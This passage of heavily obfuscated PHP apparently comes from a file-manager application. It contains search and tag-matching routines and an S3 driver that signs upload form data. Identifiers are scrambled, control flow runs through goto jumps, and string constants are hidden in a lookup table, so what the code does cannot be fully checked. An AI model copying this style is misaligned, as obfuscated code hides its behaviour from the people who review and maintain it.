ÀÕã[2375]; $d¶‹´åÛì¸ = $B¸Á’‹°¥¶; goto d§ìğÄ§…Ç; DÛ‡‡šòåÈ: $this->_listSearchGroupTag($B­“åÛ²¼, $fÈß®¼’°Ã, $d¶‹´åÛì¸); $this->_listDataApply($B­“åÛ²¼[$FÎ¢ª ÀÕã[370]]); $this->_listMake($B­“åÛ²¼); goto F’ÒÂ¢¿ÇÃ; fš¨†™áÍ: $FÎ¢ª ÀÕã =& $_SERVER[åÌÛ»ô¢‚ö™]; if (isset($fÈß®¼’°Ã[$FÎ¢ª ÀÕã[2219]]) && $fÈß®¼’°Ã[$FÎ¢ª ÀÕã[2219]]) { $fÈß®¼’°Ã[$FÎ¢ª ÀÕã[2219]] = str_replace($FÎ¢ª ÀÕã[383], $FÎ¢ª ÀÕã[2374], trim($fÈß®¼’°Ã[$FÎ¢ª ÀÕã[2219]])); } $BàÙ²§ŞÀ£ = $this->_parseSearchWhere($fÈß®¼’°Ã); goto E÷È¤ƒÈë«; d§ìğÄ§…Ç: $this->_listSearchBindPinyin($fÈß®¼’°Ã, $BàÙ²§ŞÀ£, $B¸Á’‹°¥¶); $this->alias($FÎ¢ª ÀÕã[513])->_makeOrder(); $BàÙ²§ŞÀ£ = $this->parseWhereLike($BàÙ²§ŞÀ£); goto AíŸˆë·Øœ; BåŞ·ô‹¢: } private function _listSearchTag(&$cˆÃ÷ÕÄà“, $Cİõç‘ÅÙ, $c¯´ÁßÄ‘) { goto D—Áñ„ÈÍ; D—Áñ„ÈÍ: $bÊğìª¸¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$Cİõç‘ÅÙ[$bÊğìª¸¡[2219]] || $cˆÃ÷ÕÄà“[$bÊğìª¸¡[367]][$bÊğìª¸¡[356]] > 1) { return; } $CÚ„éÚ‘· = Model($bÊğìª¸¡[2376])->listData(); goto B¿ìñğ‚ê¹; B¿ìñğ‚ê¹: $a×‚„ÏœÏÙ = array(); $dØÌ–Ñï‘ = $Cİõç‘ÅÙ[$bÊğìª¸¡[2219]]; foreach ($CÚ„éÚ‘· as $f††ÈùàÜï) { $F„Ğ²ÖöŒ“ = $f††ÈùàÜï[$bÊğìª¸¡[28]]; $b”–ŞŠÒ” = str_replace($bÊğìª¸¡[50], $bÊğìª¸¡[33], Pinyin::encode($F„Ğ²ÖöŒ“)); if (stripos($F„Ğ²ÖöŒ“, $dØÌ–Ñï‘) !== !1 || stripos($b”–ŞŠÒ”, $dØÌ–Ñï‘) !== !1) { $a×‚„ÏœÏÙ[] = $f††ÈùàÜï[$bÊğìª¸¡[392]]; } } goto C³¬¼è’ğ‰; BéÔ…½‘œœ: $BÓÌ­®¥†œ = array_to_keyvalue($BÓÌ­®¥†œ, $bÊğìª¸¡[33], $bÊğìª¸¡[75]); $A·™ğ„á¢İ = array_unique($BÓÌ­®¥†œ); $this->_listSearchMerge($cˆÃ÷ÕÄà“, $Cİõç‘ÅÙ, $c¯´ÁßÄ‘, $A·™ğ„á¢İ); goto bï¦“ÌöËŒ; C³¬¼è’ğ‰: if (!$a×‚„ÏœÏÙ) { return; } $eÌ„¬½œ‡‹ = array($bÊğìª¸¡[418] => array($bÊğìª¸¡[7], $a×‚„ÏœÏÙ), $bÊğìª¸¡[1465] => USER_ID); $BÓÌ­®¥†œ = Model($bÊğìª¸¡[419])->field($bÊğìª¸¡[75])->where($eÌ„¬½œ‡‹)->select(); goto BéÔ…½‘œœ; bï¦“ÌöËŒ: } private function _listSearchDesc(&$B„Í¤Î¹Ø, $DóØ‚êäÈË, $e½áñ‹½Èò) { goto DÔê±É±¦; DÔê±É±¦: $aöß¼Éñáæ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$DóØ‚êäÈË[$aöß¼Éñáæ[2219]] || $B„Í¤Î¹Ø[$aöß¼Éñáæ[367]][$aöß¼Éñáæ[356]] > 1) { return; } $AÛƒ æ˜‰ = $this->listSearchChildren($DóØ‚êäÈË[$aöß¼Éñáæ[487]]); goto b…íÙ §‰Œ; e¾ãô¸Õ¢: $F®ßóæµÛÔ = Model($aöß¼Éñáæ[530])->field($aöß¼Éñáæ[394])->where($bêä±ÏËêè)->select(); $eŠ‹ âÚèÉ = array_to_keyvalue($F®ßóæµÛÔ, $aöß¼Éñáæ[33], $aöß¼Éñáæ[394]); $this->_listSearchMerge($B„Í¤Î¹Ø, $DóØ‚êäÈË, $e½áñ‹½Èò, $eŠ‹ âÚèÉ); goto eñ¡õ‰ù­; b…íÙ §‰Œ: $AÛƒ æ˜‰ = array_unique($AÛƒ æ˜‰); if (!$AÛƒ æ˜‰) { return; } $bêä±ÏËêè = array($aöß¼Éñáæ[394] => array($aöß¼Éñáæ[7], $AÛƒ æ˜‰), $aöß¼Éñáæ[89] => $aöß¼Éñáæ[430], $aöß¼Éñáæ[375] => array($aöß¼Éñáæ[382], $aöß¼Éñáæ[2221] . $DóØ‚êäÈË[$aöß¼Éñáæ[2219]] . $aöß¼Éñáæ[2221])); goto e¾ãô¸Õ¢; eñ¡õ‰ù­: } private function _listSearchGroupTag(&$f ¤ÒŒÒºç, $CÛ‰øÚ³¯Á, $Bíˆ¯…Á¢) { goto b±‹ºî¸Ì×; b±‹ºî¸Ì×: $EŒë¶ÜŠóè =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$CÛ‰øÚ³¯Á[$EŒë¶ÜŠóè[2219]] || $f ¤ÒŒÒºç[$EŒë¶ÜŠóè[367]][$EŒë¶ÜŠóè[356]] > 1 || !$CÛ‰øÚ³¯Á[$EŒë¶ÜŠóè[487]]) { return; } $FÆµº‹ï™‘ = $this->sourceInfo($CÛ‰øÚ³¯Á[$EŒë¶ÜŠóè[487]]); goto b°¢Ò¬ÔÌ; E¨ß‡‚èÙï: $dÆŒ­¦Ë£ = array_to_keyvalue($dÆŒ­¦Ë£, $EŒë¶ÜŠóè[33], $EŒë¶ÜŠóè[75]); $CÍïƒË¯ç = array_unique($dÆŒ­¦Ë£); $this->_listSearchMerge($f ¤ÒŒÒºç, $CÛ‰øÚ³¯Á, $Bíˆ¯…Á¢, $CÍïƒË¯ç); goto E±õƒ¿Š‚; b°¢Ò¬ÔÌ: if (!$FÆµº‹ï™‘ || $FÆµº‹ï™‘[$EŒë¶ÜŠóè[396]] != SourceModel::TYPE_GROUP) { return; } $B­ÉÇÔĞÑÈ = $FÆµº‹ï™‘[$EŒë¶ÜŠóè[482]]; $fÚõĞÄÙÌ = Model($EŒë¶ÜŠóè[2377])->get($B­ÉÇÔĞÑÈ); goto e«««é±ÍŠ; e«««é±ÍŠ: $eô•Çä‰íµ = array(); $C¢Ìëô°õ = $CÛ‰øÚ³¯Á[$EŒë¶ÜŠóè[2219]]; foreach ($fÚõĞÄÙÌ[$EŒë¶ÜŠóè[370]] as $D¡÷÷Ä ˆò) { $CÀÙëµ¬îõ = $D¡÷÷Ä ˆò[$EŒë¶ÜŠóè[28]]; $aØô ÂÎ™Æ = str_replace($EŒë¶ÜŠóè[50], $EŒë¶ÜŠóè[33], Pinyin::encode($CÀÙëµ¬îõ)); if (stripos($CÀÙëµ¬îõ, $C¢Ìëô°õ) !== !1 || stripos($aØô ÂÎ™Æ, $C¢Ìëô°õ) !== !1) { $eô•Çä‰íµ[] = $D¡÷÷Ä ˆò[$EŒë¶ÜŠóè[392]]; } } goto A‘£ê™™Ú; A‘£ê™™Ú: if (!$eô•Çä‰íµ) { return; } $Aàİ¸Áš—Ÿ = array($EŒë¶ÜŠóè[418] => array($EŒë¶ÜŠóè[7], $eô•Çä‰íµ), $EŒë¶ÜŠóè[1465] => 0, $EŒë¶ÜŠóè[29] => $EŒë¶ÜŠóè[2239] . $B­ÉÇÔĞÑÈ); $dÆŒ­¦Ë£ = Model($EŒë¶ÜŠóè[419])->field($EŒë¶ÜŠóè[75])->where($Aàİ¸Áš—Ÿ)->select(); goto E¨ß‡‚èÙï; E±õƒ¿Š‚: } private function _listSearchMerge(&$b´“™®èôø, $A¨¢·Í‚÷Ó, $fæïË¦­æê, $BÅ¨³êÉŠ) { goto bøÀÂŒ—ŠŒ; c·¨ÈëæØ: $b‡Úô¢®Ë = array_diff($BÅ¨³êÉŠ, $d¢„Åàô); if (!$b‡Úô¢®Ë) { return; } $EŒŒ·¤ÈÀ = array($aÊ›ë´ö ³[394] => array($aÊ›ë´ö ³[7], $b‡Úô¢®Ë)); goto a×Õ‰Œçö; bøÀÂŒ—ŠŒ: $aÊ›ë´ö ³ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$BÅ¨³êÉŠ) { return; } $d¢„Åàô = array_to_keyvalue($b´“™®èôø[$aÊ›ë´ö ³[370]], $aÊ›ë´ö ³[33], $aÊ›ë´ö ³[394]); goto c·¨ÈëæØ; a×Õ‰Œçö: $F•¡Œ ôåñ = $this->field($fæïË¦­æê)->where($EŒŒ·¤ÈÀ)->select(); if (!$F•¡Œ ôåñ) { return; } $dŒåÈÅî™° = array(); goto Aå­˜Õ²ê¨; Aå­˜Õ²ê¨: foreach ($F•¡Œ ôåñ as $C„¸âˆØ‘ˆ) { $CÍ§æ“‚œä = $aÊ›ë´ö ³[47] . $A¨¢·Í‚÷Ó[$aÊ›ë´ö ³[487]] . $aÊ›ë´ö ³[47]; if (stripos($C„¸âˆØ‘ˆ[$aÊ›ë´ö ³[485]], $CÍ§æ“‚œä) !== !1) { $dŒåÈÅî™°[] = $C„¸âˆØ‘ˆ; } } $b´“™®èôø[$aÊ›ë´ö ³[370]] = array_merge($dŒåÈÅî™°, $b´“™®èôø[$aÊ›ë´ö ³[370]]); $b´“™®èôø[$aÊ›ë´ö ³[367]][$aÊ›ë´ö ³[368]] += count($dŒåÈÅî™°); goto eÌ²‹ä´°; eÌ²‹ä´°: } public function listSearchChildren($B¢ÕÎÆÁ›ì, $dÆÎØµš¤‚ = 5000) { goto CïóÄø´ÌŸ; bßğœ¨Ò„Ö: $eĞ÷·èÇÅ = array($EÖ¹’âŠâ[485] => array($EÖ¹’âŠâ[382], $c¢ê£ô¹ºğ[$EÖ¹’âŠâ[485]] . $c¢ê£ô¹ºğ[$EÖ¹’âŠâ[394]] . $EÖ¹’âŠâ[510])); $CÈÓˆ…Ü¼Ø = $this->field($EÖ¹’âŠâ[394])->cache(null, 600)->where($eĞ÷·èÇÅ)->count(); if ($CÈÓˆ…Ü¼Ø > $dÆÎØµš¤‚) { return $this->_listSearchChildrenNear($B¢ÕÎÆÁ›ì, $dÆÎØµš¤‚); } goto CÛÜ’İƒ; CÛÜ’İƒ: $eÀºìÃ–Ã§ = $this->field($EÖ¹’âŠâ[394])->where($eĞ÷·èÇÅ)->select(); $C†¯Á¢ù– = array_to_keyvalue($eÀºìÃ–Ã§, $EÖ¹’âŠâ[33], $EÖ¹’âŠâ[394]); return $C†¯Á¢ù–; goto dêë´ò£œŸ; CïóÄø´ÌŸ: $EÖ¹’âŠâ =& $_SERVER[åÌÛ»ô¢‚ö™]; $C†¯Á¢ù– = array(); $c¢ê£ô¹ºğ = $this->sourceInfo($B¢ÕÎÆÁ›ì); goto bßğœ¨Ò„Ö; dêë´ò£œŸ: } private function _listSearchChildrenNear($dçÂÏÄ’›, $C›ÇÖØöÛ») { goto AŞ™¢Ø‰Î©; e›¢Ë²Õ…: $d¬ì¿©Œ¢ = array_merge($d¬ì¿©Œ¢, array_to_keyvalue($E¤ÅŸ‚Ÿ˜, $eæí™¡¢…[33], $eæí™¡¢…[394])); $d¬ì¿©Œ¢ = array_slice($d¬ì¿©Œ¢, 0, $C›ÇÖØöÛ»); return $d¬ì¿©Œ¢; goto b¤×‚ÓøâĞ; E®±º¡–¬â: if (!$D²×‡îÎè«) { return $d¬ì¿©Œ¢; } $b†ñ´øŒÃ = array($eæí™¡¢…[487] => array($eæí™¡¢…[7], $D²×‡îÎè«)); $E¤ÅŸ‚Ÿ˜ = $this->field($eæí™¡¢…[2378])->where($b†ñ´øŒÃ)->limit($C›ÇÖØöÛ»)->select(); goto e›¢Ë²Õ…; A«¡ÁìĞœ: $E¤ÅŸ‚Ÿ˜ = $this->field($eæí™¡¢…[2378])->where($b†ñ´øŒÃ)->select(); $D²×‡îÎè« = array_to_keyvalue(array_filter_by_field($E¤ÅŸ‚Ÿ˜, $eæí™¡¢…[395], $eæí™¡¢…[83]), $eæí™¡¢…[33], $eæí™¡¢…[394]); $d¬ì¿©Œ¢ = array_merge($d¬ì¿©Œ¢, array_to_keyvalue($E¤ÅŸ‚Ÿ˜, $eæí™¡¢…[33], $eæí™¡¢…[394])); goto E®±º¡–¬â; AŞ™¢Ø‰Î©: $eæí™¡¢… =& $_SERVER[åÌÛ»ô¢‚ö™]; $d¬ì¿©Œ¢ = array(); $b†ñ´øŒÃ = array($eæí™¡¢…[487] => $dçÂÏÄ’›); goto A«¡ÁìĞœ; b¤×‚ÓøâĞ: } private function _listSearchBindPinyin($B‘Ì–ÁÌÂÑ, &$aˆ¯¥Ëºò§, &$AæŸíÇÀ²) { goto CÔ©®”ŞÉÉ; c º´”„œŠ: foreach ($A…ƒÚ„¦ as $bÉêŒÔ»‡„) { $dİÕØÊÑ÷í[] = array($EÉğ¢œŠÌ[2382] => $bÉêŒÔ»‡„, $EÉğ¢œŠÌ[935] => $EÉğ¢œŠÌ[2223], array($EÉğ¢œŠÌ[2383] => $bÉêŒÔ»‡„, $EÉğ¢œŠÌ[2384] => array($EÉğ¢œŠÌ[7], array($EÉğ¢œŠÌ[441], $EÉğ¢œŠÌ[440])))); } $this->join($D›’µëÓÜ™); $aˆ¯¥Ëºò§ = $dİÕØÊÑ÷í; goto d©‹ ‡§­¿; c¤Ñ´µ·Í¾: $A…ƒÚ„¦ = $aˆ¯¥Ëºò§[$EÉğ¢œŠÌ[28]]; unset($aˆ¯¥Ëºò§[$EÉğ¢œŠÌ[28]]); foreach ($aˆ¯¥Ëºò§ as $D»—¼ŠŸ‹¨ => $e…ï¬¤…µ¨) { $dİÕØÊÑ÷í[$EÉğ¢œŠÌ[2380] . $D»—¼ŠŸ‹¨] = $e…ï¬¤…µ¨; } goto c º´”„œŠ; B×ŸÕİî•“: $dİÕØÊÑ÷í = array(); $AæŸíÇÀ² = str_replace(array($EÉğ¢œŠÌ[183], $EÉğ¢œŠÌ[50], $EÉğ¢œŠÌ[2379]), $EÉğ¢œŠÌ[33], $AæŸíÇÀ²); $AæŸíÇÀ² = $EÉğ¢œŠÌ[2380] . str_replace($EÉğ¢œŠÌ[47], $EÉğ¢œŠÌ[2381], $AæŸíÇÀ²); goto c¤Ñ´µ·Í¾; CÔ©®”ŞÉÉ: $EÉğ¢œŠÌ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!Input::check($B‘Ì–ÁÌÂÑ[$EÉğ¢œŠÌ[2219]], $EÉğ¢œŠÌ[321]) || strlen($B‘Ì–ÁÌÂÑ[$EÉğ¢œŠÌ[2219]]) < 2) { return; } $D›’µëÓÜ™ = "\114\105\106\124\x20\x4a\x4f\111\x4e\40{$this->tablePrefix}\x69\x6f\137\163\x6f\x75\x72\x63\145\137\x6d\x65\164\141\40\155\x65\164\x61\40\157\156\x20\163\x6f\x75\x72\x63\x65\56\163\157\x75\x72\143\145\111\104\40\x3d\40\155\145\x74\141\56\x73\157\x75\x72\143\x65\x49\104"; goto B×ŸÕİî•“; d©‹ ‡§­¿: } private function _parseSearchWhere($bÁÍ“Ï–Æê) { goto DÊåíìÈ¯²; DÊåíìÈ¯²: $b†´Àº‹˜İ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fåõ­­¨à™ = array(); if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[729]])) { $fåõ­­¨à™[$b†´Àº‹˜İ[107]] = array($b†´Àº‹˜İ[2385], $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[729]]); } goto DöÖïÛ«Õ; DöÖïÛ«Õ: if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[473]])) { $e’ØİÓ¥õÔ = array($b†´Àº‹˜İ[2386], $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[473]]); if ($fåõ­­¨à™[$b†´Àº‹˜İ[107]]) { $fåõ­­¨à™[$b†´Àº‹˜İ[107]] = array($fåõ­­¨à™[$b†´Àº‹˜İ[107]], $e’ØİÓ¥õÔ, $b†´Àº‹˜İ[2387]); } else { $fåõ­­¨à™[$b†´Àº‹˜İ[107]] = $e’ØİÓ¥õÔ; } } if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2388]])) { $fåõ­­¨à™[$b†´Àº‹˜İ[77]] = array($b†´Àº‹˜İ[2385], $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2388]]); } if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2389]])) { $e’ØİÓ¥õÔ = array($b†´Àº‹˜İ[2386], $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2389]]); if ($fåõ­­¨à™[$b†´Àº‹˜İ[77]]) { $fåõ­­¨à™[$b†´Àº‹˜İ[77]] = array($fåõ­­¨à™[$b†´Àº‹˜İ[77]], $e’ØİÓ¥õÔ, $b†´Àº‹˜İ[2387]); } else { $fåõ­­¨à™[$b†´Àº‹˜İ[77]] = $e’ØİÓ¥õÔ; } } goto f²¬•ñÃÓ; f²¬•ñÃÓ: if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[560]])) { $fåõ­­¨à™[] = array($b†´Àº‹˜İ[404] => $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[560]], $b†´Àº‹˜İ[403] => $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[560]], $b†´Àº‹˜İ[935] => $b†´Àº‹˜İ[2223]); } if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[397]])) { $b÷ÏÊÀ”šæ = $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[397]]; if ($b÷ÏÊÀ”šæ == $b†´Àº‹˜İ[76]) { $fåõ­­¨à™[$b†´Àº‹˜İ[395]] = 1; } else { if ($b÷ÏÊÀ”šæ == $b†´Àº‹˜İ[2390]) { $fåõ­­¨à™[$b†´Àº‹˜İ[395]] = 0; } else { if ($b÷ÏÊÀ”šæ) { $b÷ÏÊÀ”šæ = is_array($b÷ÏÊÀ”šæ) ? $b÷ÏÊÀ”šæ : explode($b†´Àº‹˜İ[47], $b÷ÏÊÀ”šæ); $fåõ­­¨à™[$b†´Àº‹˜İ[397]] = array($b†´Àº‹˜İ[409], $b÷ÏÊÀ”šæ); $fåõ­­¨à™[$b†´Àº‹˜İ[395]] = 0; } } } } if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[487]])) { $dØÇÌãÃîà = $this->sourceInfo($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[487]]); $fåõ­­¨à™[$b†´Àº‹˜İ[551]] = array($b†´Àº‹˜İ[509], $dØÇÌãÃîà[$b†´Àº‹˜İ[485]] . $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[487]] . $b†´Àº‹˜İ[510]); } goto cõ‡ÉÌØ; cõ‡ÉÌØ: if (isset($bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2219]]) && $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2219]]) { $AœÚ”Ğò– = $bÁÍ“Ï–Æê[$b†´Àº‹˜İ[2219]]; $CÎ—ƒã¡ = explode($b†´Àº‹˜İ[50], $AœÚ”Ğò–); if (strlen($AœÚ”Ğò–) > 2 && (substr($AœÚ”Ğò–, 0, 1) == $b†´Àº‹˜İ[113] && substr($AœÚ”Ğò–, -1) == $b†´Àº‹˜İ[113]) || substr($AœÚ”Ğò–, 0, 1) == $b†´Àº‹˜İ[55] && substr($AœÚ”Ğò–, -1) == $b†´Àº‹˜İ[55]) { $AœÚ”Ğò– = substr($AœÚ”Ğò–, 1, -1); $CÎ—ƒã¡ = array($AœÚ”Ğò–); } $fåõ­­¨à™[$b†´Àº‹˜İ[28]] = array(array($b†´Àº‹˜İ[509], $b†´Àº‹˜İ[2221] . $AœÚ”Ğò– . $b†´Àº‹˜İ[2221])); if (count($CÎ—ƒã¡) > 1) { $fåõ­­¨à™[$b†´Àº‹˜İ[28]] = array(); foreach ($CÎ—ƒã¡ as $B‰‹×È¤•Ø) { if (!trim($B‰‹×È¤•Ø)) { continue; } $fåõ­­¨à™[$b†´Àº‹˜İ[28]][] = array($b†´Àº‹˜İ[509], $b†´Àº‹˜İ[2221] . trim($B‰‹×È¤•Ø) . $b†´Àº‹˜İ[2221]); } } } return $fåõ­­¨à™; goto cİÁ©©ªÆ; cİÁ©©ªÆ: } } goto E‡ùÇÏˆ¶©; DÏ¿œ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($fğ¯´èÔ÷) { parent::__construct($fğ¯´èÔ÷); } public function uploadFormData($bÑ¢ä·ã§¬, $FôäÂ’Ûœí = 3600) { goto bö‹Ğˆ‚Ğˆ; EŸ‹ÔùÆ‹•: $e¤‰óšÔÒ = hash_hmac($A«Øãë˜‹[1170], $e‹‰åËÌØÚ, $aÊ›îÌ‡©µ, !0); $fÜİˆ–éÃõ = hash_hmac($A«Øãë˜‹[1170], $BáãñÃã‘õ, $e¤‰óšÔÒ, !0); $Cß‡…Ê÷ª„ = hash_hmac($A«Øãë˜‹[1170], $f…ÑéÂò×È, $fÜİˆ–éÃõ); goto F»—Î‹Šƒ…; EÔ“Œ›ë—: $BáãñÃã‘õ = $A«Øãë˜‹[1162]; $BÄ¾è†¿×Ì = $FôäÂ’Ûœí . $A«Øãë˜‹[33]; $bà§ÀâĞÃÄ = $A«Øãë˜‹[1126]; goto d‘˜ø¦ƒÍ„; E»¸°¡†©: $f…ÑéÂò×È = base64_encode(json_encode($BîÌ„‡´‰)); $aÑ·íªİÆ¿ = hash_hmac($A«Øãë˜‹[1170], $Dö«±ªãÊ, $A«Øãë˜‹[1171] . $this->secret, !0); $aÊ›îÌ‡©µ = hash_hmac($A«Øãë˜‹[1170], $this->region, $aÑ·íªİÆ¿, !0); goto EŸ‹ÔùÆ‹•; F»—Î‹Šƒ…: $d†¹¬ïÀÈø = array($A«Øãë˜‹[217] => $A«Øãë˜‹[33], $A«Øãë˜‹[1172] => $A«Øãë˜‹[33], $A«Øãë˜‹[1130] => $Añ Óˆ–á, $A«Øãë˜‹[1134] => $bà§ÀâĞÃÄ, $A«Øãë˜‹[1138] => $f…ÑéÂò×È, $A«Øãë˜‹[1173] => $f¶ÌÜ„ÈÑô, $A«Øãë˜‹[1174] => $eË´¿¡Ê, $A«Øãë˜‹[1175] => $dĞÃîª‹ª, $A«Øãë˜‹[1176] => $BÄ¾è†¿×Ì, $A«Øãë˜‹[1177] => $Cß‡…Ê÷ª„, $A«Øãë˜‹[173] => $this->getHost()); return $d†¹¬ïÀÈø; goto eŒÍ§™Ã»µ; d‘˜ø¦ƒÍ„: $eÙó¥±Š¦© = array($this->accessKey, $Dö«±ªãÊ, $this->region, $e‹‰åËÌØÚ, $BáãñÃã‘õ); $f¶ÌÜ„ÈÑô = implode($A«Øãë˜‹[8], $eÙó¥±Š¦©); $BîÌ„‡´‰ = array($A«Øãë˜‹[1128] => gmdate($A«Øãë˜‹[1127], strtotime($A«Øãë˜‹[1163])), $A«Øãë˜‹[1129] => array(array($A«Øãë˜‹[1131] => $this->bucket), array($A«Øãë˜‹[1130] => $Añ Óˆ–á), array($A«Øãë˜‹[1132], $A«Øãë˜‹[1133], $A«Øãë˜‹[33]), array($A«Øãë˜‹[1132], $A«Øãë˜‹[1164], $A«Øãë˜‹[33]), array($A«Øãë˜‹[1132], $A«Øãë˜‹[1165], $A«Øãë˜‹[33]), array($A«Øãë˜‹[1134] => $bà§ÀâĞÃÄ), array($A«Øãë˜‹[1166] => $f¶ÌÜ„ÈÑô), array($A«Øãë˜‹[1167] => $eË´¿¡Ê), array($A«Øãë˜‹[1168] => $dĞÃîª‹ª), array($A«Øãë˜‹[1169] => $BÄ¾è†¿×Ì))); goto E»¸°¡†©; eè–ÏŸÄí: $e‹‰åËÌØÚ = $A«Øãë˜‹[59]; $dĞÃîª‹ª = gmdate($A«Øãë˜‹[1161]); $Dö«±ªãÊ = gmdate($A«Øãë˜‹[717]); goto EÔ“Œ›ë—; bö‹Ğˆ‚Ğˆ: $A«Øãë˜‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Añ Óˆ–á = $A«Øãë˜‹[199]; $eË´¿¡Ê = $A«Øãë˜‹[1160]; goto eè–ÏŸÄí; eŒÍ§™Ã»µ: } public function multiUploadFormData($fšÎ‘šº«, $DäëÊˆÅƒâ = 3600) { $aöäÆŒİ¨ï =& $_SERVER[åÌÛ»ô¢‚ö™]; $f†…ÓùŸÜù = gmdate($aöäÆŒİ¨ï[1256]); $eƒê¤Áœ = array(); $b¹½…Şôì = $this->client->getUploadId($this->bucket, $fšÎ‘šº«, $eƒê¤Áœ); if (!$b¹½…Şôì) { return !1; } return array($aöäÆŒİ¨ï[227] => $b¹½…Şôì, $aöäÆŒİ¨ï[173] => $this->getHost() . $aöäÆŒİ¨ï[8] . $this->pathEncode($fšÎ‘šº«), $aöäÆŒİ¨ï[228] => $f†…ÓùŸÜù, $aöäÆŒİ¨ï[89] => $fšÎ‘šº«); } public function multiUploadAuthData($cííÈíÚƒ, $a†¤¤³è† = array()) { goto E‰¡Ñãªİ¾; bÍ»¼³Ï¾÷: if (strpos($dÛ ¤àìÉš, $fÓôƒÅ¼[231]) === 0) { if (isset($B‡Òè§ß¾¨[$fÓôƒÅ¼[1258]])) { $dÛİêá«æº = $B‡Òè§ß¾¨[$fÓôƒÅ¼[1258]]; } else { if (isset($BöŞÆËäÏ‡[$fÓôƒÅ¼[1258]])) { $dÛİêá«æº = $BöŞÆËäÏ‡[$fÓôƒÅ¼[1258]]; } else { $dÛİêá«æº = hash($fÓôƒÅ¼[1170], $fÓôƒÅ¼[33]); } } return array($fÓôƒÅ¼[237] => $BöŞÆËäÏ‡[$fÓôƒÅ¼[237]], $fÓôƒÅ¼[1258] => $dÛİêá«æº, $fÓôƒÅ¼[228] => $BöŞÆËäÏ‡[$fÓôƒÅ¼[1261]]); } return $BöŞÆËäÏ‡[$fÓôƒÅ¼[237]]; goto Dâ…¹ØâÌÕ; E‰¡Ñãªİ¾: $fÓôƒÅ¼ =& $_SERVER[åÌÛ»ô¢‚ö™]; $dÛ ¤àìÉš = isset($a†¤¤³è†[$fÓôƒÅ¼[165]]) ? $a†¤¤³è†[$fÓôƒÅ¼[165]] : $fÓôƒÅ¼[33]; $dÅ¾×§İ¤ = $a†¤¤³è†[$fÓôƒÅ¼[89]]; goto aóöÅ·á³ì; C‚À©ëÒ®: if (isset($a†¤¤³è†[$fÓôƒÅ¼[1257]])) { $B‡Òè§ß¾¨[$fÓôƒÅ¼[1258]] = $a†¤¤³è†[$fÓôƒÅ¼[1257]]; } $b”ÍÊì÷ª× = explode($fÓôƒÅ¼[175], $this->getHost()); $Cñ‡÷°†„® = array($fÓôƒÅ¼[1259] => $b”ÍÊì÷ª×[1], $fÓôƒÅ¼[1260] => $fÓôƒÅ¼[33], $fÓôƒÅ¼[217] => $fÓôƒÅ¼[116], $fÓôƒÅ¼[1172] => $a†¤¤³è†[$fÓôƒÅ¼[77]]); goto A¾Ë¼ç’Â; aóöÅ·á³ì: unset($a†¤¤³è†[$fÓôƒÅ¼[89]]); if (isset($a†¤¤³è†[$fÓôƒÅ¼[229]])) { return $this->listUploadParts($dÅ¾×§İ¤, $a†¤¤³è†); } $B‡Òè§ß¾¨ = array(); goto C‚À©ëÒ®; A¾Ë¼ç’Â: $d¼µç½Êöª = $fÓôƒÅ¼[232]; $F”õÕ±İÚİ = $fÓôƒÅ¼[8] . $this->pathEncode($dÅ¾×§İ¤) . $dÛ ¤àìÉš; $BöŞÆËäÏ‡ = $this->client->__getSignatureV4($B‡Òè§ß¾¨, $Cñ‡÷°†„®, $d¼µç½Êöª, $F”õÕ±İÚİ); goto bÍ»¼³Ï¾÷; Dâ…¹ØâÌÕ: } public function listUploadParts($e­ÚºóöÎ, $dó—òäÒ‘Æ = array()) { goto cõëÑ–Ç; f›“ã¹÷¶­: $EÆ»Ó«¹çî .= $F†‚Ûš²šÇ[1265]; $B¦½áÖè‚¯ = array(); $E­²”¶äÙ™ = explode($F†‚Ûš²šÇ[175], $this->getHost()); goto B„ÔÒõ‰‡Ö; aË´…¨Ì±Ó: if (!$B¿ĞŞ×ÌŠ¼) { return !1; } $EÆ»Ó«¹çî = $F†‚Ûš²šÇ[1262]; foreach ($B¿ĞŞ×ÌŠ¼ as $fâÀ¿ø£Ú) { $EÆ»Ó«¹çî .= $F†‚Ûš²šÇ[1263] . "\74\x50\x61\x72\164\116\165\155\142\x65\162\76{$fâÀ¿ø£Ú[$F†‚Ûš²šÇ[1217]]}\x3c\x2f\120\x61\162\164\116\x75\155\x62\145\x72\76\xa" . "\74\x45\124\x61\147\76{$fâÀ¿ø£Ú[$F†‚Ûš²šÇ[1218]]}\74\x2f\x45\x54\141\147\76\12" . $F†‚Ûš²šÇ[1264]; } goto f›“ã¹÷¶­; B„ÔÒõ‰‡Ö: $cÊ²µ—”­š = array($F†‚Ûš²šÇ[1259] => $E­²”¶äÙ™[1], $F†‚Ûš²šÇ[217] => $F†‚Ûš²šÇ[116], $F†‚Ûš²šÇ[1172] => strlen($EÆ»Ó«¹çî)); $a²ÍŠÊÜ×« = $F†‚Ûš²šÇ[230]; $B’’’˜ğ™Ü = $F†‚Ûš²šÇ[8] . $this->pathEncode($e­ÚºóöÎ) . $dó—òäÒ‘Æ[$F†‚Ûš²šÇ[165]]; goto eÃÅ¤íÚğØ; cõëÑ–Ç: $F†‚Ûš²šÇ =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÂ†Œ–äÊà = 